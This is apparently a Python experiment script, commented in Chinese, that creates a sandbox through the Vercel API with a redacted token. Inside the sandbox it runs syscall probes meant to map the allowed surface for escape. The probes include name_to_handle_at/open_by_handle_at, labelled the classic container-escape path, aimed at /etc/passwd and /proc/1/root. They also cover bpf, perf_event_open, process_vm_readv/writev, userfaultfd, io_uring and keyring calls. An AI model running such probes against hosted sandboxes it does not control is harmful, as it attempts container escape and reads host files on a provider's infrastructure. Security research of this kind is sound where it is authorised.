# -*- coding: utf-8 -*-
"""实验J287w: 单测高危syscall允许面 - name_to_handle_at/open_by_handle_at/bpf/process_vm等"""
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("EXIT:", json.dumps(d.get("command", {}))[:300], flush=True)
        except Exception:
            print("NONJSON:", line[:400], flush=True)
    return out

NAME = "expj287w"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# cmd1: name_to_handle_at + open_by_handle_at (容器逃逸经典路径)
out = run_cmd(sid, r'''
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
AT_FDCWD = -100
class FileHandle(ctypes.Structure):
    _fields_ = [("handle_bytes", ctypes.c_uint), ("handle_type", ctypes.c_int),
                ("f_handle", ctypes.c_byte * 128)]
h = FileHandle()
h.handle_bytes = 128
mid = ctypes.c_int(0)
for path in (b"/etc/passwd", b"/", b"/proc/1/root/etc/passwd"):
    h.handle_bytes = 128
    r = libc.syscall(303, AT_FDCWD, path, ctypes.byref(h), ctypes.byref(mid), 0)
    e = ctypes.get_errno()
    print("n2h %s rc=%d errno=%d bytes=%d type=%d mount_id=%d" % (
        path.decode(), r, e, h.handle_bytes, h.handle_type, mid.value), flush=True)
    if r == 0:
        # open_by_handle_at: mount_fd 用打开的根目录
        mfd = os.open("/", os.O_RDONLY | os.O_DIRECTORY)
        fd = libc.syscall(304, mfd, ctypes.byref(h), os.O_RDONLY)
        e2 = ctypes.get_errno()
        print("  obh rc=%d errno=%d" % (fd, e2), flush=True)
        if fd >= 0:
            data = os.read(fd, 200)
            print("  READ:", repr(data[:200]), flush=True)
            os.close(fd)
        os.close(mfd)
print("DONE", flush=True)
''', "N2H", timeout=100)
print("N2H out:", repr((out or "")[:1500]), flush=True)

# cmd2: bpf + perf_event_open 允许面
out = run_cmd(sid, r'''
import ctypes, struct
libc = ctypes.CDLL(None, use_errno=True)
# bpf(BPF_MAP_CREATE=0, NULL, 0) -> EFAULT 表示允许
r = libc.syscall(321, 0, 0, 0)
print("bpf NULL rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
# 真实 BPF_MAP_CREATE: type=HASH(1), key=4, val=4, max=16
attr = struct.pack("IIIIIIIIIIII", 1, 4, 4, 16, 0, 0, 0, 0, 0, 0, 0, 0)
buf = ctypes.create_string_buffer(attr, len(attr))
fd = libc.syscall(321, 0, ctypes.byref(buf), 64)
print("bpf MAP_CREATE rc=%d errno=%d" % (fd, ctypes.get_errno()), flush=True)
if fd >= 0:
    os.close(fd)
# perf_event_open(NULL, 0, 0, -1, 0) -> EFAULT/允许面
r = libc.syscall(298, 0, 0, 0, -1, 0)
print("perf_event_open rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
print("DONE", flush=True)
''', "BPF", timeout=100)
print("BPF out:", repr((out or "")[:1200]), flush=True)

# cmd3: process_vm / kcmp / seccomp / userfaultfd
out = run_cmd(sid, r'''
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
me = os.getpid()
# process_vm_readv(self, NULL, 0, NULL, 0, 0)
r = libc.syscall(310, me, 0, 0, 0, 0, 0)
print("process_vm_readv rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
r = libc.syscall(311, me, 0, 0, 0, 0, 0)
print("process_vm_writev rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
r = libc.syscall(312, me, 1, 0, 0, 0)
print("kcmp rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
r = libc.syscall(317, 0, 0, 0)  # SECCOMP_SET_MODE_STRICT
print("seccomp rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
r = libc.syscall(323, 0)  # userfaultfd
print("userfaultfd rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
if r >= 0:
    os.close(r)
r = libc.syscall(447, 0)  # memfd_secret
print("memfd_secret rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
if r >= 0:
    os.close(r)
print("DONE", flush=True)
''', "PVM", timeout=100)
print("PVM out:", repr((out or "")[:1200]), flush=True)

# cmd4: io_uring + add_key/request_key/keyctl
out = run_cmd(sid, r'''
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
# io_uring_setup(0, NULL) -> EINVAL/允许面; 再试真实 setup
r = libc.syscall(425, 0, 0)
print("io_uring_setup(0) rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
class Params(ctypes.Structure):
    _fields_ = [("sq_entries", ctypes.c_uint32), ("cq_entries", ctypes.c_uint32),
                ("flags", ctypes.c_uint32), ("sq_thread_cpu", ctypes.c_uint32),
                ("sq_thread_idle", ctypes.c_uint32), ("features", ctypes.c_uint32),
                ("wd", ctypes.c_uint32), ("sq_off", ctypes.c_uint32 * 12),
                ("cq_off", ctypes.c_uint32 * 11), ("padding", ctypes.c_uint32 * 2)]
p = Params()
r = libc.syscall(425, 2, ctypes.byref(p))
print("io_uring_setup(2) rc=%d errno=%d sq=%d cq=%d" % (r, ctypes.get_errno(), p.sq_entries, p.cq_entries), flush=True)
if r >= 0:
    os.close(r)
# keyring syscalls: 248 add_key, 249 request_key, 250 keyctl
r = libc.syscall(248, 0, 0, 0, 0, 0)
print("add_key rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
r = libc.syscall(249, 0, 0, 0, 0, 0)
print("request_key rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
r = libc.syscall(250, 0, 0, 0, 0)
print("keyctl rc=%d errno=%d" % (r, ctypes.get_errno()), flush=True)
print("DONE", flush=True)
''', "IUR", timeout=100)
print("IUR out:", repr((out or "")[:1200]), flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
